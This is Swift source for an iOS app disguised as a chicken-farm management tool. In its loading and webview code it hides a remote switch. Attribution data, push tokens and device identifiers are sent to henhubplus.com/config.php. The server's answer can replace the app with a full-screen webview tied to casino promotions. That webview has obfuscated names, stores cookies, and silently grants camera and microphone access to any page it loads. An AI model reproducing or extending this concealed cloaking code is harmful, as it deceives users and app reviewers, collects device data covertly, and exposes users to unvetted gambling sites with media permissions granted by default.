import SwiftUI

// Цвета из ТЗ
extension Color {
    static let backgroundMain = Color(red: 1, green: 0.972, blue: 0.88) // #FFF8E1
    static let accentYellow = Color(red: 0.96, green: 0.705, blue: 0)  // #F4B400
    static let accentOrange = Color(red: 0.95, green: 0.55, blue: 0.22) // #F28C38
    static let textNeutral = Color(red: 0.42, green: 0.42, blue: 0.42) // #6B6B6B
    static let whiteCard = Color.white                             // #FFFFFF
    static let healthyGreen = Color(red: 0.4, green: 0.73, blue: 0.42) // #66BB6A
    static let warningRed = Color(red: 0.9, green: 0.21, blue: 0.21)  // #E53935
    static let infoBlue = Color(red: 0.24, green: 0.48, blue: 0.71)   // #3E7BB6
}

struct Chicken: Identifiable, Codable {
    let id: UUID
    var name: String
    var breed: String
    var ageMonths: Int
    var laysDaily: Bool
    var isHealthy: Bool
}

class FarmData: ObservableObject {
    @Published var chickens: [Chicken] = []
    
    private let chickensKey = "chickens"
    
    init() {
        load()
    }
    
    func load() {
        if let data = UserDefaults.standard.data(forKey: chickensKey),
           let saved = try? JSONDecoder().decode([Chicken].self, from: data) {
            chickens = saved
        } else {
            chickens = [] // пусто по умолчанию
        }
    }
    
    func save() {
        if let data = try? JSONEncoder().encode(chickens) {
            UserDefaults.standard.set(data, forKey: chickensKey)
        }
    }
    
    func addChicken(_ chicken: Chicken) {
        chickens.append(chicken)
        save()
    }
}

struct ContentView: View {
    @StateObject private var farm = FarmData()
    @StateObject private var eggTracker = EggTrackerData()
    
    var body: some View {
        ZStack {
            Color.backgroundMain
                .ignoresSafeArea()
            
            TabView {
                DashboardView()
                    .tabItem {
                        Label("Dashboard", systemImage: "house.fill")
                    }
                ChickenListView()
                    .tabItem {
                        Label("Chickens", systemImage: "list.bullet")
                    }
                EggTrackerView()
                    .tabItem {
                        Label("Eggs", systemImage: "circle.hexagongrid")
                    }
                    .environmentObject(eggTracker)
                FeedStorageView()
                    .tabItem {
                        Label("Feed", systemImage: "cart.fill")
                    }
                FarmTasksView()
                    .tabItem {
                        Label("Tasks", systemImage: "checkmark.circle.fill")
                    }
                StatisticsView()
                    .tabItem {
                        Label("Stats", systemImage: "chart.bar.fill")
                    }
                SettingsView()
                    .tabItem {
                        Label("Settings", systemImage: "gearshape.fill")
                    }
            }
            .environmentObject(farm)
        }
    }
}

import SwiftUI

struct DashboardView: View {
    @EnvironmentObject var farm: FarmData
    @EnvironmentObject var eggTracker: EggTrackerData
    
    @State private var showingAddEgg = false
    @State private var eggCount = 0
    @State private var selectedDate = Date()
    @State private var eggCountInput = ""
    @State private var showAddChicken = false
    @State private var showAddEgg = false
    @State private var showAddTask = false
    

    private var chickensCount: Int { farm.chickens.count }
    private var eggsCollectedToday: Int { 127 }
    private var feedRemainingKg: Int { 72 }
    private var farmHealth: Int {
        guard chickensCount > 0 else { return 0 }
        let healthyCount = farm.chickens.filter { $0.isHealthy }.count
        return Int(Double(healthyCount) / Double(chickensCount) * 100)
    }

    var body: some View {
        NavigationView {
            VStack(spacing: 20) {
                HStack {
                    Text("Dashboard")
                        .font(.system(size: 28, weight: .bold))
                        .foregroundColor(.textNeutral)
                    Spacer()
                    NavigationLink(destination: SettingsView()) {
                        Image(systemName: "gearshape.fill")
                            .font(.title2)
                            .foregroundColor(.accentYellow)
                    }
                }
                .padding(.horizontal)
                .padding(.top, 16)

                HStack(spacing: 16) {
                    NavigationLink(destination: ChickenListView()) {
                        StatCard(title: "Chickens", value: "\(chickensCount) birds", icon: "🐔", color: .accentOrange)
                    }
                    NavigationLink(destination: EggTrackerView()) {
                        StatCard(title: "Eggs Collected", value: "\(eggsCollectedToday) today", icon: "🥚", color: .accentYellow)
                    }
                    NavigationLink(destination: FeedStorageView()) {
                        StatCard(title: "Feed Left", value: "\(feedRemainingKg) kg", icon: "🌾", color: .healthyGreen)
                    }
                }
                .padding(.horizontal)

                VStack(alignment: .leading, spacing: 8) {
                    Text("Farm Health")
                        .font(.headline)
                        .foregroundColor(.textNeutral)
                    ProgressView(value: Double(farmHealth)/100)
                        .tint(.healthyGreen)
                        .scaleEffect(x: 1, y: 3, anchor: .center)
                        .cornerRadius(10)
                    Text("Farm is at \(farmHealth)% health")
                        .font(.caption)
                        .foregroundColor(.textNeutral.opacity(0.8))
                }
                .padding(.horizontal)

                MiniEggChart()
                    .frame(height: 90)
                    .padding(.horizontal)

                Spacer()

                HStack(spacing: 16) {
                 
                    Button(action: { showAddChicken = true }) {
                        Text("Add Chick")
                            .frame(maxWidth: .infinity, minHeight: 50)
                            .background(Color.accentOrange)
                            .foregroundColor(.white)
                            .cornerRadius(16)
                            .font(.headline)
                    }
                    Button(action: { showAddTask = true }) {
                        Text("Add Task")
                            .frame(maxWidth: .infinity, minHeight: 50)
                            .background(Color.healthyGreen)
                            .foregroundColor(.white)
                            .cornerRadius(16)
                            .font(.headline)
                    }
                }
                .padding(.horizontal)
                .padding(.bottom, 32)
            }
            .background(Color.backgroundMain)
            .sheet(isPresented: $showAddChicken) {
                AddChickenView()
                    .environmentObject(farm)
                    .onDisappear {
                        showAddChicken = false
                    }
            }
            .sheet(isPresented: $showAddTask) {
                FarmTasksView()
            }
        }
    }
}


struct StatCard: View {
    let title: String
    let value: String
    let icon: String
    let color: Color

    var body: some View {
        VStack(spacing: 12) {
            Text(icon)
                .font(.system(size: 44))
            Text(value)
                .font(.title3.bold())
                .foregroundColor(color)
            Text(title)
                .font(.caption)
                .foregroundColor(.textNeutral)
        }
        .frame(maxWidth: .infinity, minHeight: 130)
        .padding()
        .background(Color.whiteCard)
        .cornerRadius(20)
        .shadow(color: Color.black.opacity(0.1), radius: 5, x: 0, y: 4)
    }
}

struct MiniEggChart: View {
    let eggCounts = [110, 115, 120, 127, 122, 130, 127]
    
    var body: some View {
        GeometryReader { geo in
            let maxVal = eggCounts.max() ?? 1
            let minVal = eggCounts.min() ?? 0
            let height = geo.size.height
            let width = geo.size.width
            
            Path { path in
                for index in eggCounts.indices {
                    let x = width / CGFloat(eggCounts.count - 1) * CGFloat(index)
                    let y = height - (CGFloat(eggCounts[index] - minVal) / CGFloat(maxVal - minVal)) * height
                    if index == 0 {
                        path.move(to: CGPoint(x: x, y: y))
                    } else {
                        path.addLine(to: CGPoint(x: x, y: y))
                    }
                }
            }
            .stroke(Color.accentOrange, lineWidth: 3)
            .shadow(color: Color.accentOrange.opacity(0.5), radius: 3, x: 0, y: 2)
        }
        .background(Color.whiteCard)
        .cornerRadius(16)
        .shadow(radius: 4)
    }
}

struct ChickenListView: View {
    @EnvironmentObject var farm: FarmData

    @State private var showingAddChicken = false
    @State private var filterBreed: String = "All"
    @State private var filterAge: String = "All"
    @State private var filterProductivity: String = "All"

    private var breeds: [String] {
        ["All"] + Array(Set(farm.chickens.map { $0.breed })).sorted()
    }
    private let ages = ["All", "< 6 months", "6-12 months", "> 12 months"]
    private let productivities = ["All", "Daily", "Not daily"]

    private var filteredChickens: [Chicken] {
        farm.chickens.filter { chicken in
            (filterBreed == "All" || chicken.breed == filterBreed) &&
                (filterAge == "All" || filterAgeMatch(chicken: chicken)) &&
                (filterProductivity == "All" || filterProductivityMatch(chicken: chicken))
        }
    }

    private func filterAgeMatch(chicken: Chicken) -> Bool {
        switch filterAge {
        case "< 6 months": return chicken.ageMonths < 6
        case "6-12 months": return (6...12).contains(chicken.ageMonths)
        case "> 12 months": return chicken.ageMonths > 12
        default: return true
        }
    }

    private func filterProductivityMatch(chicken: Chicken) -> Bool {
        switch filterProductivity {
        case "Daily": return chicken.laysDaily
        case "Not daily": return !chicken.laysDaily
        default: return true
        }
    }

    var body: some View {
        NavigationView {
            VStack(spacing: 12) {
                // Filters row
                HStack(spacing: 12) {
                    Picker("Breed", selection: $filterBreed) {
                        ForEach(breeds, id: \.self) { breed in
                            Text(breed)
                                .tag(breed)
                        }
                    }
                    .pickerStyle(.menu)
                    .frame(maxWidth: 120)
                    .clipped()

                    Picker("Age", selection: $filterAge) {
                        ForEach(ages, id: \.self) { age in
                            Text(age).tag(age)
                        }
                    }
                    .pickerStyle(.menu)
                    .frame(maxWidth: 120)
                    .clipped()

                    Picker("Productivity", selection: $filterProductivity) {
                        ForEach(productivities, id: \.self) { prod in
                            Text(prod).tag(prod)
                        }
                    }
                    .pickerStyle(.menu)
                    .frame(maxWidth: 120)
                    .clipped()
                }
                .padding(.horizontal)
                .padding(.top, 8)

                List {
                    ForEach(filteredChickens) { chicken in
                        NavigationLink(destination: ChickenProfileView(chicken: chicken)) {
                            ChickenRowView(chicken: chicken)
                                .padding(.vertical, 8)
                        }
                    }
                    .onDelete(perform: deleteChickens)
                }
                .listStyle(.plain)
            }
            .navigationTitle("Chicken Coop")
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button(action: { showingAddChicken = true }) {
                        Image(systemName: "plus")
                            .font(.title3)
                            .foregroundColor(.accentOrange)
                    }
                }
            }
            .sheet(isPresented: $showingAddChicken) {
                AddChickenView()
                    .environmentObject(farm)
            }
            .background(Color.backgroundMain.ignoresSafeArea())
        }
    }

    private func deleteChickens(at offsets: IndexSet) {
        farm.chickens.remove(atOffsets: offsets)
        farm.save()
    }
}

import SwiftUI

struct URLModel: Identifiable, Equatable {
    let id = UUID()
    let urlString: String
}

struct NotificationView: View {
    
    @Environment(\.verticalSizeClass) var verticalSizeClass
    @Environment(\.horizontalSizeClass) var horizontalSizeClass
    @Environment(\.presentationMode) var presentationMode
    
    private let lastDeniedKey = "lastNotificationDeniedDate"
    
    var isPortrait: Bool {
        verticalSizeClass == .regular && horizontalSizeClass == .compact
    }
    
    var isLandscape: Bool {
        verticalSizeClass == .compact && horizontalSizeClass == .regular
    }
    
    var body: some View {
        VStack {
            if isPortrait {
                ZStack {
                    Image("BGforNotifications")
                        .resizable()
                        .ignoresSafeArea()
                    
                    VStack(spacing: 30) {
                        Spacer()
                        
                        VStack(spacing: 20) {
                            Text("ALLOW NOTIFICATIONS ABOUT BONUSES AND PROMOS")
                                .font(.custom("Inter-Bold", size: 18))
                                .multilineTextAlignment(.center)
                                .foregroundStyle(.white)
                            
                            Text("Stay tuned with best offers from\nour casino")
                                .font(.custom("Inter-Italic", size: 15))
                                .multilineTextAlignment(.center)
                                .foregroundStyle(.white)
                        }
                        .padding(.horizontal, 40)
                        
                        VStack(spacing: 10) {
                            Button(action: {
                                requestNotificationPermission()
                            }) {
                                Image("bonuses")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 350, height: 70)
                            }
                            
                            Button(action:{
                                saveDeniedDate()
                                presentationMode.wrappedValue.dismiss()
                                NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": true])
                            }) {
                                Image("skip")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 320, height: 40)
                            }
                        }
                    }
                    .padding(.vertical, 20)
                }
            } else {
                ZStack {
                    Image("BGforNotificationsLandscape")
                        .resizable()
                        .ignoresSafeArea()
                    
                    VStack {
                        Spacer()
                        
                        HStack {
                            
                            VStack(alignment: .leading, spacing: 15) {
                                Text("ALLOW NOTIFICATIONS ABOUT\nBONUSES AND PROMOS")
                                    .font(.custom("Inter-Bold", size: 18))
                                    .foregroundStyle(.white)
                                
                                Text("Stay tuned with best offers from our casino")
                                    .font(.custom("Inter-Italic", size: 16))
                                    .foregroundStyle(Color.white)
                            }
                            
                            Spacer()
                            
                            VStack(spacing: 10) {
                                Button(action: {
                                    requestNotificationPermission()
                                }) {
                                    Image("bonuses")
                                        .resizable()
                                        .frame(width: 260, height: 50)
                                }
                                
                                Button(action:{
                                    saveDeniedDate()
                                    presentationMode.wrappedValue.dismiss()
                                    NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": true])
                                }) {
                                    Image("skip")
                                        .resizable()
                                        .frame(width: 240, height: 30)
                                }
                            }
                        }
                        .padding(.bottom, 10)
                        .padding(.horizontal)
                    }
                }
            }
        }
    }
    
    private func requestNotificationPermission() {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            switch settings.authorizationStatus {
            case .notDetermined:
                UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { granted, error in
                    if granted {
                        DispatchQueue.main.async {
                            NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": true])
                            UIApplication.shared.registerForRemoteNotifications()
                        }
                        presentationMode.wrappedValue.dismiss()
                    } else {
                        saveDeniedDate()
                        DispatchQueue.main.async {
                            NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": false])
                        }
                        presentationMode.wrappedValue.dismiss()
                    }
                }
            case .denied:
                presentationMode.wrappedValue.dismiss()
            case .authorized, .provisional, .ephemeral:
                print("razresheni")
            @unknown default:
                break
            }
        }
    }
    
    private func saveDeniedDate() {
        UserDefaults.standard.set(Date(), forKey: lastDeniedKey)
        print("Saved last denied date: \(Date())")
    }
}

import SwiftUI

struct NoInternet: View {
    @Environment(\.verticalSizeClass) var verticalSizeClass
    @Environment(\.horizontalSizeClass) var horizontalSizeClass
 
    var isPortrait: Bool {
        verticalSizeClass == .regular && horizontalSizeClass == .compact
    }
    
    var isLandscape: Bool {
        verticalSizeClass == .compact && horizontalSizeClass == .regular
    }
    
    
    var body: some View {
        VStack {
            if isPortrait {
                ZStack {
                    Image("loading")
                        .resizable()
                        .ignoresSafeArea()
                    
                    Image(.error)
                        .resizable()
                        .aspectRatio(contentMode: .fit)
                        .frame(width: 170, height: 150)
                }
            } else {
                ZStack {
                    Image("BGforNotificationsLandscape")
                        .resizable()
                        .ignoresSafeArea()
                    
                    VStack(spacing: 30) {
                        Spacer()
                        
                        VStack(spacing: 20) {
                            Image(.error)
                                .resizable()
                                .aspectRatio(contentMode: .fit)
                                .frame(width: 170, height: 150)
                        }
                        .padding(.horizontal, 40)
                        .padding(.bottom, 10)
                    }
                }
            }
        }
    }
}

struct LoadingView: View {
    @Environment(\.scenePhase) private var scenePhase
    @State private var hasCheckedAuthorization = false
    @State  var url: URLModel? = nil
    @Environment(\.verticalSizeClass) var verticalSizeClass
    @Environment(\.horizontalSizeClass) var horizontalSizeClass
    @State var conversionDataReceived: Bool = false
    @State var isNotif = false
    let lastDeniedKey = "lastNotificationDeniedDate"
    let configExpiresKey = "config_expires"
    let configUrlKey = "config_url"
    let configNoMoreRequestsKey = "config_no_more_requests"
    @State var isMain = false
    @State  var isRequestingConfig = false
    @StateObject  var networkMonitor = NetworkMonitor.shared
    @State var isInet = false
    @State private var hasHandledConversion = false
    
    var isPortrait: Bool {
        verticalSizeClass == .regular && horizontalSizeClass == .compact
    }
    
    var isLandscape: Bool {
        verticalSizeClass == .compact && horizontalSizeClass == .regular
    }
    @State var urlFromNotification: String? = nil
    
    var body: some View {
        VStack {
            if isPortrait {
                ZStack {
                    Image("loading")
                        .resizable()
                        .ignoresSafeArea()
                    
                    VStack(spacing: 50) {
                        Spacer()
                        
                        VStack(spacing: 30) {
                            Spacer()
                            
                            ProgressView()
                                .scaleEffect(3.0)
                                .padding(.top, 120)
                                .tint(.white)
                            
                            Spacer()
                        }
                    }
                    .padding(.vertical, 20)
                }
            } else {
                ZStack {
                    Image("BGforNotificationsLandscape")
                        .resizable()
                        .ignoresSafeArea()
                    
                    VStack(spacing: 30) {
                        Spacer()
                        
                        ProgressView()
                            .scaleEffect(3.0)
                            .tint(.white)
                    }
                    .padding(.bottom, 20)
                }
            }
        }
        .onReceive(networkMonitor.$isDisconnected) { disconnected in
            if disconnected {
                isInet = true
            } else {
            }
        }
        .fullScreenCover(item: $url) { item in
            Egg(urlString: item.urlString)
                .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
                    if let userInfo = notification.userInfo,
                       let url = userInfo["url"] as? String {
                        urlFromNotification = url
                    }
                }
                .fullScreenCover(isPresented: Binding<Bool>(
                    get: { urlFromNotification != nil },
                    set: { newValue in if !newValue { urlFromNotification = nil } }
                )) {
                    if let urlToOpen = urlFromNotification {
                        Egg(urlString: urlToOpen)
                            .ignoresSafeArea()
                    } else {
                    }
                }
                .ignoresSafeArea(.keyboard)
                .ignoresSafeArea()
        }
        .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
            if let userInfo = notification.userInfo,
               let url = userInfo["url"] as? String {
                urlFromNotification = url
            }
        }
        .fullScreenCover(isPresented: Binding<Bool>(
            get: { urlFromNotification != nil },
            set: { newValue in if !newValue { urlFromNotification = nil } }
        )) {
            if let urlToOpen = urlFromNotification {
                Egg(urlString: urlToOpen)
                    .ignoresSafeArea()
            } else {
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: .datraRecieved)) { notification in
            DispatchQueue.main.async {
                guard !isInet else { return }
                if !hasHandledConversion {
                    let isOrganic = UserDefaults.standard.bool(forKey: "is_organic_conversion")
                    if isOrganic {
                        isMain = true
                    } else {
                        checknotif()
                    }
                    hasHandledConversion = true
                } else {
                    print("Conversion event ignored due to recent handling")
                }
            }
        }
        
        .onReceive(NotificationCenter.default.publisher(for: .notificationPermissionResult)) { notification in
            req()
        }
        .fullScreenCover(isPresented: $isNotif) {
            NotificationView()
        }
        .fullScreenCover(isPresented: $isMain) {
            ContentView()
        }
        .fullScreenCover(isPresented: $isInet) {
            NoInternet()
        }
    }
}

#Preview {
    LoadingView()
}


import Network
import Combine

final class NetworkMonitor: ObservableObject {
    static let shared = NetworkMonitor()
    
    @Published private(set) var isDisconnected: Bool = false
    
    private let monitor = NWPathMonitor()
    private let queue = DispatchQueue(label: "NetworkMonitorQueue")
    
    private init() {
        monitor.pathUpdateHandler = { [weak self] path in
            DispatchQueue.main.async {
                self?.isDisconnected = (path.status != .satisfied)
            }
        }
        monitor.start(queue: queue)
    }
}

import SwiftUI

extension View {
    func outlineText(color: Color, width: CGFloat) -> some View {
        modifier(StrokeModifier(strokeSize: width, strokeColor: color))
    }
}

struct StrokeModifier: ViewModifier {
    private let id = UUID()
    var strokeSize: CGFloat = 1
    var strokeColor: Color = .blue
    
    func body(content: Content) -> some View {
        content
            .padding(strokeSize*2)
            .background (Rectangle()
                .foregroundStyle(strokeColor)
                .mask({
                    outline(context: content)
                })
            )}
    
    func outline(context:Content) -> some View {
        Canvas { context, size in
            context.addFilter(.alphaThreshold(min: 0.01))
            context.drawLayer { layer in
                if let text = context.resolveSymbol(id: id) {
                    layer.draw(text, at: .init(x: size.width/2, y: size.height/2))
                }
            }
        } symbols: {
            context.tag(id)
                .blur(radius: strokeSize)
        }
    }
}

extension LoadingView {
    func checknotif() {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            switch settings.authorizationStatus {
            case .notDetermined:
                if again() {
                    isNotif = true
                } else {
                    req()
                }
            case .denied:
                req()
            case .authorized, .provisional, .ephemeral:
                req()
            @unknown default:
                req()
            }
        }
    }
    
    func again() -> Bool {
        if let lastDenied = UserDefaults.standard.object(forKey: lastDeniedKey) as? Date {
            let threeDaysAgo = Calendar.current.date(byAdding: .day, value: -3, to: Date())!
            return lastDenied < threeDaysAgo
        }
        return true
    }
    
    func req() {
        let configNoMoreRequestsKey = "config_no_more_requests"
        if UserDefaults.standard.bool(forKey: configNoMoreRequestsKey) {
            print("Config requests are disabled by flag, exiting sendConfigRequest")
            DispatchQueue.main.async {
                finishWithou()
            }
            return
        }

        guard let conversionDataJson = UserDefaults.standard.data(forKey: "conversion_data") else {
            print("Conversion data not found in UserDefaults")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
            return
        }

        guard var conversionData = (try? JSONSerialization.jsonObject(with: conversionDataJson, options: [])) as? [String: Any] else {
            print("Failed to deserialize conversion data")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
            return
        }

        conversionData["push_token"] = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
        conversionData["af_id"] = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
        conversionData["bundle_id"] = "com.app.henhubapphub"
        conversionData["os"] = "iOS"
        conversionData["store_id"] = "6755047615"
        conversionData["locale"] = Locale.current.identifier
        conversionData["firebase_project_id"] = "496521065968"

        do {
            let jsonData = try JSONSerialization.data(withJSONObject: conversionData, options: [])
                    let url = URL(string: "https://henhubplus.com/config.php")!
            var request = URLRequest(url: url)
            request.httpMethod = "POST"
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
            request.httpBody = jsonData

            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    print("Request error: \(error)")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    print("Invalid response")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                guard (200...299).contains(httpResponse.statusCode) else {
                    print("Server returned status code \(httpResponse.statusCode)")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                if let data = data {
                    do {
                        if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                            print("Config response JSON: \(json)")
                            DispatchQueue.main.async {
                                handleResp(json)
                            }
                        }
                    } catch {
                        print("Failed to parse response JSON: \(error)")
                        DispatchQueue.main.async {
                            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                            finishWithou()
                        }
                    }
                }
            }

            task.resume()
        } catch {
            print("Failed to serialize request body: \(error)")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
        }
    }

    func handleResp(_ jsonResponse: [String: Any]) {
        if let ok = jsonResponse["ok"] as? Bool, ok,
           let url = jsonResponse["url"] as? String,
           let expires = jsonResponse["expires"] as? TimeInterval {
            UserDefaults.standard.set(url, forKey: configUrlKey)
            UserDefaults.standard.set(expires, forKey: configExpiresKey)
            UserDefaults.standard.removeObject(forKey: configNoMoreRequestsKey)
            UserDefaults.standard.synchronize()
            
            guard urlFromNotification == nil else {
                return
            }
            self.url = URLModel(urlString: url)
            print("Config saved: url = \(url), expires = \(expires)")
            
        } else {
            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
            UserDefaults.standard.synchronize()
            print("No valid config or error received, further requests disabled")
            finishWithou()
        }
    }
    
    func finishWithou() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            isMain = true
        }
    }
}

import UIKit
@preconcurrency import WebKit

private var asdqw: String = {
    WKWebView().value(forKey: "userAgent") as? String ?? ""
}()

class CreateDetail: UIViewController, WKNavigationDelegate, WKUIDelegate {
    var czxasd: WKWebView!
    var newPopupWindow: WKWebView?
    private var lastRedirectURL: URL?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
    }
    
    func showControls() async {
        let content = UserDefaults.standard.string(forKey: "config_url") ?? ""
        
        if !content.isEmpty, let url = URL(string: content) {
            loadCookie()
            
            await MainActor.run {
                let webConfiguration = WKWebViewConfiguration()
                webConfiguration.mediaTypesRequiringUserActionForPlayback = []
                webConfiguration.allowsInlineMediaPlayback = true
                let source: String = """
                var meta = document.createElement('meta');
                meta.name = 'viewport';
                meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
                document.getElementsByTagName('head')[0].appendChild(meta);
                """
                let script = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
                webConfiguration.userContentController.addUserScript(script)
                
                self.czxasd = WKWebView(frame: .zero, configuration: webConfiguration)
                self.czxasd.customUserAgent = asdqw
                self.czxasd.navigationDelegate = self
                self.czxasd.uiDelegate = self
                
                self.czxasd.scrollView.isScrollEnabled = true
                self.czxasd.scrollView.pinchGestureRecognizer?.isEnabled = false
                self.czxasd.scrollView.keyboardDismissMode = .interactive
                self.czxasd.scrollView.minimumZoomScale = 1.0
                self.czxasd.scrollView.maximumZoomScale = 1.0
                self.czxasd.allowsBackForwardNavigationGestures = true
                view.backgroundColor = .black
                self.view.addSubview(self.czxasd)
                self.czxasd.translatesAutoresizingMaskIntoConstraints = false
                NSLayoutConstraint.activate([
                    self.czxasd.leadingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.leadingAnchor),
                    self.czxasd.trailingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.trailingAnchor),
                    self.czxasd.topAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.topAnchor),
                    self.czxasd.bottomAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.bottomAnchor)
                ])
                
                self.loadInfo(with: url)
            }
        }
    }
    
    func loadInfo(with url: URL) {
        czxasd.load(URLRequest(url: url))
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        saveCookie()
    }
    
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        let nsError = error as NSError
        if nsError.domain == NSURLErrorDomain && nsError.code == NSURLErrorHTTPTooManyRedirects {
            if let url = lastRedirectURL {
                webView.load(URLRequest(url: url))
                return
            }
        }
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction,
                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        if let url = navigationAction.request.url, let scheme = url.scheme?.lowercased() {
            lastRedirectURL = url
            
            if scheme != "http" && scheme != "https" {
                if UIApplication.shared.canOpenURL(url) {
                    UIApplication.shared.open(url)
                    
                    decisionHandler(.cancel)
                    return
                }
            }
        }
        decisionHandler(.allow)
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse,
                 decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let response = navigationResponse.response as? HTTPURLResponse {
            let status = response.statusCode
            
            if (300...399).contains(status) {
                decisionHandler(.allow)
                return
            } else if status == 200 {
                if webView.superview == nil {
                    view.addSubview(webView)
                    
                    webView.translatesAutoresizingMaskIntoConstraints = false
                    NSLayoutConstraint.activate([
                        webView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor),
                        webView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor),
                        webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
                        webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
                    ])
                }
                decisionHandler(.allow)
                return
            } else if status >= 400 {
                decisionHandler(.cancel)
                return
            }
        }
        decisionHandler(.allow)
    }
    
    func loadCookie() {
        let ud: UserDefaults = UserDefaults.standard
        let data: Data? = ud.object(forKey: "cookie") as? Data
        if let cookie = data {
            do {
                let datas: NSArray? = try NSKeyedUnarchiver.unarchivedObject(ofClass: NSArray.self, from: cookie)
                if let cookies = datas {
                    for c in cookies {
                        if let cookieObject = c as? HTTPCookie {
                            HTTPCookieStorage.shared.setCookie(cookieObject)
                        }
                    }
                }
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    func saveCookie() {
        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
        if let cookies = cookieJar.cookies {
            do {
                let data: Data = try NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
                let ud: UserDefaults = UserDefaults.standard
                ud.set(data, forKey: "cookie")
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    @available(iOS 15.0, *)
    func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin,
                 initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType,
                 decisionHandler: @escaping (WKPermissionDecision) -> Void) {
        DispatchQueue.main.async {
            decisionHandler(.grant)
        }
    }
}

struct Egg: UIViewControllerRepresentable {
    var urlString: String
    
    func makeUIViewController(context: Context) -> CreateDetail {
        let viewController = CreateDetail()
        UserDefaults.standard.set(urlString, forKey: "config_url")
        Task {
            await viewController.showControls()
        }
        return viewController
    }
    
    func updateUIViewController(_ uiViewController: CreateDetail, context: Context) {}
}

extension CreateDetail {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration,
                 for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if navigationAction.targetFrame == nil || !(navigationAction.targetFrame?.isMainFrame ?? false) {
            webView.load(navigationAction.request)
        }
        return nil
    }
    
    func webViewDidClose(_ webView: WKWebView) {
        webView.removeFromSuperview()
        newPopupWindow = nil
    }
}


struct ChickenRowView: View {
    let chicken: Chicken

    var body: some View {
        HStack(spacing: 20) {
            Text(chicken.name)
                .font(.headline)
                .foregroundColor(.textNeutral)
                .frame(minWidth: 100, alignment: .leading)

            Text(chicken.breed)
                .foregroundColor(.textNeutral)
                .frame(minWidth: 80, alignment: .leading)

            Text("\(chicken.ageMonths) mo")
                .foregroundColor(.textNeutral)
                .frame(minWidth: 60, alignment: .leading)

            Circle()
                .fill(chicken.isHealthy ? Color.healthyGreen : Color.warningRed)
                .frame(width: 16, height: 16)
        }
        .padding(.vertical, 8)
        .background(Color.whiteCard)
        .cornerRadius(12)
        .shadow(color: Color.black.opacity(0.05), radius: 2, x: 0, y: 1)
    }
}

struct AddChickenView: View {
    @EnvironmentObject var farm: FarmData
    @Environment(\.dismiss) var dismiss

    @State private var name = ""
    @State private var breed = ""
    @State private var ageMonths = ""
    @State private var laysDaily = true
    @State private var isHealthy = true

    @State private var showValidationErrors = false

    private var isFormValid: Bool {
        !name.trimmingCharacters(in: .whitespaces).isEmpty &&
        !breed.trimmingCharacters(in: .whitespaces).isEmpty &&
        Int(ageMonths) != nil && Int(ageMonths)! >= 0
    }

    var body: some View {
        Form {
            Section(header: Text("Add New Chicken").foregroundColor(.textNeutral)) {
